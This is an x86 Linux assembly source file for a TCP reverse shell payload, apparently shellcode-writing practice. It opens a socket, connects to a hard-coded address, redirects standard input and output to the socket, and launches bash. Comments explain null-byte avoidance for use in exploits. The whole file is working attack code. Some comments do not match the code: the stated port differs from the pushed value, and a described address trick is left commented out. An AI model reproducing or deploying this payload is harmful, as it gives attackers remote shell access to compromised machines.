;TCP Reverse Shell
;Author : Dibyendu
global _start

section .text
_start:
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx

	;int socketcall(int call, unsigned long *args);
	;int socket(int domain, int type, int protocol);
	mov al,0x66 ; socketcall syscall 102 ( in decimal )
	mov bl,0x1  ; SYS_SOCKET id = 1 at /usr/include/linux/net.h
	push ecx ; ecx has null
	push 0x1 ; SOCK_STREAM = 1
	push 0x2    ; AF_INET = 2
	mov ecx,esp ; ecx point to top of stack
	int 0x80

	add esp,0xC ; 4+4+4 = 12 ; bring the stack to initial state	

	;connect ; SYS_CONNECT id = 3
	;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	;struct sockaddr_in {
   	;	short            sin_family;   // e.g. AF_INET
    	;	unsigned short   sin_port;     // e.g. htons(3490)
    	;	struct in_addr   sin_addr;     // see struct in_addr, below
    	;	char             sin_zero[8];  // zero this if you want to
	;	};

	xor edx,edx
	mov edx,eax

	xor eax,eax
	xor ebx,ebx

	mov al,0x66 ; socketcall syscall
	mov bl,0x3 ; SYS_CONNET id = 3
	
	sub esp, 0x8      ; memset(&(my_addr.sin_zero),'\0',8);
	;>>> socket.inet_aton('127.0.0.1')
	;'\x7f\x00\x00\x01'
	;Using \x00 will introduce bad characters in shellcode
	;>>> socket.inet_aton('127.1.1.1')
	;'\x7f\x01\x01\x01'
	;We will subtract the 0x7f7f7f7f with X to get the value 127.0.0.1 and push it to stack again 
	;127.0.0.1 => 0x7f000001
	;128.127.127.127 = 0x807f7f7f
	;Subtracting we get 0x017f7f7e
	;So if we subtract both we will get 0x7f000001, to bypass bad character generation

	xor esi,esi
	xor edi,edi
	;push 0x7f7f7f80 ; little endian
	;pop esi
	;push 0x7e7f7f01
	;pop edi
	;sub esi,edi
	;push esi
	;xor esi,esi
	;xor edi,edi
	push 0x7f7f7f7f
	push word 10275  ; socket.htons(9002) => 10787 => 0x2A23,  sin_port
        push word 0x2     ; AF_INET => 2 , sin_family
	mov ecx,esp

	
	push 0x10 ; socklen_t addrlen = 16 ;	
	push ecx
	push edx ; edx has socket descriptor
	mov ecx,esp 
	int 0x80
	
	add esp,0x1C ; 4+4+4+4+4+4+4 = 28 = 0x1C
	
	;----------------------dup2----------------------------
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx

	mov al,0x3F ; dup2 => 63 0x3F
	mov ebx,edx ; edx has the fd 
	push ecx    ; Step 1
	pop ecx     ; Step 2 - the above two process combines to push 0, to avoid \x00 in shellcode
	int 0x80
	
	;ALWAYS REMEMBER dup2 returns value which stores in EAX , do XOR ALWAYS !!
	xor eax,eax
	mov al,0x3F
	mov cl,0x1
	int 0x80

	xor eax,eax
	mov al,0x3F
	mov cl,0x2
	int 0x80
	


	int 0x80
	
	;----------------------execve shellcode--------------
        ;execve shellcode using stack technique

        ;__NR_execve 11 ; 0xB
        ;'hsab'.encode('hex') => '68736162'
        ;'/nib'.encode('hex') => '2f6e6962'
        ;'////'.encode('hex') => '2f2f2f2f'
        ;>>> 'hs/n'.encode('hex')
        ;'68732f6e'
        ;>>> 'ib//'.encode('hex')
        ;'69622f2f'

        xor eax,eax
        push eax
        push 0x68736162
        push 0x2f6e6962
        push 0x2f2f2f2f
        ;push 0x68732f6e
        ;push 0x69622f2f
        mov ebx,esp
        push eax
        mov edx,esp
        push ebx
        mov ecx,esp

        mov al,0xB
        int 0x80


	;exit shellcode
	xor eax,eax
	xor ebx,ebx
	mov al,0x1
	mov bl,0x2
	int 0x80
